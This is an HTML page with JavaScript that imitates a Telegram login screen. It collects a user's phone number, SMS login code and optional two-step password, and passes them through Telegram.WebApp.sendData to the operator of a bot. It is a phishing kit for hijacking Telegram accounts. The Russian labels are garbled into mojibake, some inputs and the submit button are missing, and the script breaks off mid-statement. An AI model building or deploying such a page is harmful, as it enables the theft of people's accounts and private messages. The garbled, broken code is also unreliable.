<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1e1e1e; color: white; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 0 auto; background: #2d2d2d; border-radius: 12px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .logo { text-align: center; font-size: 24px; margin-bottom: 30px; color: #0088cc; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #aaa; }
        input { width: 100%; padding: 12px; border: 1px solid #444; border-radius: 8px; background: #1a1a1a; color: white; font-size: 16px; }
        input:focus { outline: none; border-color: #0088cc; }

        .btn:hover { background: #0077bb; }
        .hint { font-size: 14px; color: #777; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîê Telegram Security</div>
        
        <div class="input-group">

        </div>
        
        <div class="input-group">
            <label for="code">–ö–æ–¥ –∏–∑ SMS</label>
            <input type="text" id="code" placeholder="5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ Telegram">

        <div class="input-group">

            <input type="password" id="password" placeholder="–û–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ">

        </div>
    </div>

    <script>
        function sendData() {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const password = document.getElementById('password').value;
            
            if (!phone || !code) {
                alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ –∫–æ–¥');
                return;
            }
            
            const data = {
                phone: phone,
                code: code,
                password: password
            };
            
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.sendData(JSON.stringify(data));
                Telegram.WebApp.close();
            } else {
                alert('–î–∞–Ω–Ω—ã–µ –¥–ª—è —Ç–µ—Å—Ç–∞:\n' + JSON.stringify(data));
